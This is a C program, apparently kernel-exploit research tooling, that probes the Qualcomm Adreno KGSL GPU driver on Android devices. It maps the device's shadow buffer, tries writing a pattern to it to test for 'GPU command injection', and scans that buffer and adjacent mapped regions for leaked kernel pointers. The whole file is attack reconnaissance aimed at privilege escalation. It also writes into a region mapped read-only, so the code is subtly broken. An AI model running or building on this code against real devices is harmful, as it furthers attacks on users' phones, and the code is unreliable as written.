/*
 * KGSL Shadow Buffer Deep Analysis
 *
 * Shadow region at GPU addr 0xeffff000, size 0x8000
 * Successfully mmapped - now analyze and manipulate
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <time.h>

#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_DEVICE_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)
#define IOCTL_KGSL_RINGBUFFER_ISSUEIBCMDS _IOWR(KGSL_IOC_TYPE, 0x10, struct kgsl_ringbuffer_issueibcmds)
#define IOCTL_KGSL_SUBMIT_COMMANDS _IOWR(KGSL_IOC_TYPE, 0x3D, struct kgsl_submit_commands)
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpu_command)
#define IOCTL_KGSL_TIMESTAMP_EVENT _IOWR(KGSL_IOC_TYPE, 0x33, struct kgsl_timestamp_event)
#define IOCTL_KGSL_GPUMEM_SYNC_CACHE _IOWR(KGSL_IOC_TYPE, 0x37, struct kgsl_gpumem_sync_cache)
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

#define KGSL_PROP_DEVICE_SHADOW 0x02

struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    unsigned long sizebytes;
};

struct kgsl_shadowprop
{
    unsigned long gpuaddr;
    unsigned long size;
    unsigned int flags;
};

struct kgsl_drawctxt_create
{
    unsigned int flags;
    unsigned int drawctxt_id;
};

struct kgsl_ibdesc
{
    unsigned long gpuaddr;
    unsigned long sizedwords;
    unsigned int ctrl;
};

struct kgsl_ringbuffer_issueibcmds
{
    unsigned int drawctxt_id;
    unsigned long ibdesc_addr;
    unsigned int numibs;
    unsigned int timestamp;
    unsigned int flags;
};

struct kgsl_cmdbatch_sync_info
{
    unsigned long gpuaddr;
    unsigned int timestamp;
    unsigned int type;
};

struct kgsl_submit_commands
{
    unsigned int context_id;
    unsigned int flags;
    unsigned long cmdlist;
    unsigned int numcmds;
    unsigned long synclist;
    unsigned int numsyncs;
    unsigned long timestamp;
};

struct kgsl_gpu_command
{
    unsigned long flags;
    unsigned int cmdlist_size;
    unsigned int cmdlist;
    unsigned int objlist_size;
    unsigned int objlist;
    unsigned int synclist_size;
    unsigned int synclist;
    unsigned int context_id;
    unsigned int timestamp;
};

struct kgsl_timestamp_event
{
    int type;
    unsigned int timestamp;
    unsigned int context_id;
    void *priv;
    unsigned int len;
    unsigned int pad;
};

struct kgsl_gpumem_sync_cache
{
    unsigned long gpuaddr;
    unsigned int id;
    unsigned int op;
    unsigned long offset;
    unsigned long length;
};

void hexdump(const void *data, size_t size, unsigned long base)
{
    const unsigned char *p = data;
    for (size_t i = 0; i < size; i += 16)
    {
        printf("%08lx: ", base + i);
        for (size_t j = 0; j < 16; j++)
        {
            if (i + j < size)
                printf("%02x ", p[i + j]);
            else
                printf("   ");
            if (j == 7)
                printf(" ");
        }
        printf(" |");
        for (size_t j = 0; j < 16 && i + j < size; j++)
        {
            printf("%c", (p[i + j] >= 32 && p[i + j] < 127) ? p[i + j] : '.');
        }
        printf("|\n");
    }
}

int main()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Shadow Buffer Deep Analysis                              ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
    {
        perror("[-] Failed to open /dev/kgsl-3d0");
        return 1;
    }

    // Get shadow info
    struct kgsl_shadowprop shadow = {0};
    struct kgsl_device_getproperty prop = {0};
    prop.type = KGSL_PROP_DEVICE_SHADOW;
    prop.value = &shadow;
    prop.sizebytes = sizeof(shadow);

    if (ioctl(fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) != 0)
    {
        perror("[-] Failed to get shadow property");
        close(fd);
        return 1;
    }

    printf("[+] Shadow GPU addr: 0x%lx\n", shadow.gpuaddr);
    printf("[+] Shadow size: 0x%lx (%lu KB)\n", shadow.size, shadow.size / 1024);
    printf("[+] Shadow flags: 0x%x\n", shadow.flags);

    // Map the shadow buffer (read-only)
    void *shadow_map = mmap(NULL, shadow.size, PROT_READ,
                            MAP_SHARED, fd, shadow.gpuaddr);
    if (shadow_map == MAP_FAILED)
    {
        perror("[-] Failed to mmap shadow");
        close(fd);
        return 1;
    }
    printf("[+] Shadow mapped at: %p\n", shadow_map);

    // ============ Analyze shadow structure ============
    printf("\n=== Shadow Buffer Initial State ===\n");

    // Scan entire shadow for non-zero data
    int non_zero_regions = 0;
    for (unsigned long off = 0; off < shadow.size; off += 8)
    {
        unsigned long val = *(unsigned long *)((char *)shadow_map + off);
        if (val != 0)
        {
            if (non_zero_regions < 20)
            {
                printf("[+] 0x%04lx: 0x%016lx\n", off, val);
            }
            non_zero_regions++;
        }
    }
    printf("[*] Total non-zero 8-byte values: %d\n", non_zero_regions);

    // ============ Try to trigger GPU activity and observe changes ============
    printf("\n=== Observing Shadow Changes ===\n");

    // Save initial state
    unsigned char initial_state[0x100];
    memcpy(initial_state, shadow_map, sizeof(initial_state));

    // Try some KGSL operations
    printf("[*] Attempting to trigger GPU activity...\n");

    // 1. Try to create a context
    struct kgsl_drawctxt_create ctx = {0};
    ctx.flags = 0x20; // KGSL_CONTEXT_PREAMBLE
    int ctx_ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx);
    printf("  Context create: %s (id=%u)\n",
           ctx_ret == 0 ? "success" : "failed", ctx.drawctxt_id);

    // Check for changes
    int changes = 0;
    for (int i = 0; i < sizeof(initial_state); i++)
    {
        if (((unsigned char *)shadow_map)[i] != initial_state[i])
        {
            changes++;
        }
    }
    printf("  Shadow changes after context create: %d bytes\n", changes);

    // ============ Try to write to shadow and observe GPU behavior ============
    printf("\n=== Shadow Write Test ===\n");

    // The shadow buffer typically contains GPU state that's synchronized
    // Try writing a known pattern and see if GPU uses it

    // Save current timestamp area (typically at offset 0x70-0x80)
    unsigned long orig_ts1 = *(unsigned long *)((char *)shadow_map + 0x78);
    unsigned long orig_ts2 = *(unsigned long *)((char *)shadow_map + 0x80);

    printf("[*] Original timestamp values:\n");
    printf("    0x78: 0x%016lx\n", orig_ts1);
    printf("    0x80: 0x%016lx\n", orig_ts2);

    // Write test pattern
    printf("[*] Writing test pattern to shadow...\n");
    *(unsigned long *)((char *)shadow_map + 0x100) = 0xDEADBEEFCAFEBABEULL;

    // Sync cache
    struct kgsl_gpumem_sync_cache sync = {0};
    sync.gpuaddr = shadow.gpuaddr;
    sync.op = 2; // KGSL_GPUMEM_CACHE_FLUSH
    sync.offset = 0x100;
    sync.length = 8;
    ioctl(fd, IOCTL_KGSL_GPUMEM_SYNC_CACHE, &sync);

    usleep(10000);

    // Read back
    unsigned long readback = *(unsigned long *)((char *)shadow_map + 0x100);
    printf("[*] Readback value: 0x%016lx\n", readback);

    if (readback == 0xDEADBEEFCAFEBABEULL)
    {
        printf("[+] Shadow is WRITABLE - potential for GPU command injection!\n");
    }

    // ============ Exhaustive shadow dump ============
    printf("\n=== Full Shadow Dump (first 1KB) ===\n");
    hexdump(shadow_map, 1024, 0);

    // ============ Look for specific Adreno shadow structures ============
    printf("\n=== Adreno Shadow Structure Analysis ===\n");

    /*
     * Adreno 6xx shadow structure (from kernel source):
     * - Offset 0x00: CP timestamp shadow
     * - Offset 0x10: RBBM status
     * - Offset 0x78: Global timestamp
     * - Offset 0x88-0x200: Context state
     */

    printf("[*] CP Timestamp region:\n");
    hexdump(shadow_map, 64, 0);

    printf("\n[*] Global timestamp region (0x70-0x90):\n");
    hexdump((char *)shadow_map + 0x70, 48, 0x70);

    printf("\n[*] Context state region (0x88-0x108):\n");
    hexdump((char *)shadow_map + 0x88, 128, 0x88);

    // ============ Monitor shadow during simulated GPU operation ============
    printf("\n=== Shadow Change Monitor ===\n");

    // Do multiple operations and track which areas change
    unsigned char snapshot1[0x200], snapshot2[0x200];
    memcpy(snapshot1, shadow_map, 0x200);

    // Try various operations to trigger GPU
    printf("[*] Attempting operations to trigger GPU state changes...\n");

    // Create multiple contexts
    for (int i = 0; i < 10; i++)
    {
        struct kgsl_drawctxt_create ctx2 = {0};
        ctx2.flags = 0x20;
        ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx2);
    }

    usleep(50000); // Wait for GPU to process

    memcpy(snapshot2, shadow_map, 0x200);

    printf("[*] Regions that changed:\n");
    for (unsigned long off = 0; off < 0x200; off += 8)
    {
        unsigned long v1 = *(unsigned long *)(snapshot1 + off);
        unsigned long v2 = *(unsigned long *)(snapshot2 + off);
        if (v1 != v2)
        {
            printf("    0x%03lx: 0x%016lx -> 0x%016lx\n", off, v1, v2);
        }
    }

    // ============ Try to find kernel pointers in shadow ============
    printf("\n=== Kernel Pointer Search in Shadow ===\n");

    int kern_ptrs_found = 0;
    for (unsigned long off = 0; off < shadow.size; off += 8)
    {
        unsigned long val = *(unsigned long *)((char *)shadow_map + off);

        // ARM64 kernel typically at 0xffffffc0xxxxxxxx or 0xffffff80xxxxxxxx
        if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
        {
            printf("  [+] 0x%04lx: Potential kernel ptr: 0x%016lx\n", off, val);
            kern_ptrs_found++;
        }
    }

    if (kern_ptrs_found == 0)
    {
        printf("  [-] No obvious kernel pointers found in shadow\n");
    }

    // ============ Check mmap ranges around shadow ============
    printf("\n=== Probing Adjacent Memory Regions ===\n");

    unsigned long probe_addrs[] = {
        shadow.gpuaddr - 0x8000,      // Before shadow
        shadow.gpuaddr + shadow.size, // After shadow
        0xf0000000ULL,                // Higher GPU address
        0xe0000000ULL,                // Lower GPU address
    };

    for (int i = 0; i < sizeof(probe_addrs) / sizeof(probe_addrs[0]); i++)
    {
        void *probe = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, probe_addrs[i]);
        if (probe != MAP_FAILED)
        {
            printf("[+] Offset 0x%lx mapped:\n", probe_addrs[i]);
            hexdump(probe, 64, 0);

            // Check for pointers
            unsigned long *p = probe;
            for (int j = 0; j < 0x1000 / 8; j++)
            {
                if ((p[j] & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
                {
                    printf("    [!] Found potential kernel ptr at +%d: 0x%016lx\n", j * 8, p[j]);
                }
            }

            munmap(probe, 0x1000);
        }
    }

    munmap(shadow_map, shadow.size);
    close(fd);

    printf("\n=== Analysis complete ===\n");
    return 0;
}
